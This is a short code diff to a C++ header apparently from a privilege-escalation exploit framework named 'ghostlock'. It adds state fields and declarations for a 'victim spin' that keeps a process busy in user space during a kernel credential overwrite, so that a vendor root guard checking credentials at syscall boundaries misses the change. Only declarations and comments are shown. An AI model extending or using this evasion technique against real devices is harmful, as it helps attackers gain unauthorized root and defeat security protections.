@@ -10,7 +10,22 @@ namespace ghostlock::session::victim {
     /* Verification contexts handed to retry_write_stage callbacks. */
     struct w2_stage_context {
         VictimContext &pipes;
+        /* Victim spin window (session/victim_spin.h): the victim busy-waits in
+         * user space across the credential write so a vendor root guard that
+         * compares credentials at syscall entry/exit never sees the change. */
+        int32_t spin_armed = 0;
+        int32_t victim_dead = 0;
+        uint32_t spin_seq = 0;
     };
+
+    /* Pre-write hook for the W2 credential stage: puts the victim into its
+     * user-space spin and waits for it to report armed. Returns 1 when armed,
+     * 0 when the spin could not be established (the blocked-read protocol then
+     * applies). Body-free when the victim is gone. */
+    int32_t arm_w2_spin(void *context);
+
+    /* Release a spin the stage is giving up on. Idempotent. */
+    void release_victim_spin(w2_stage_context &stage);
 
     struct w3_stage_context {
         VictimContext &pipes;
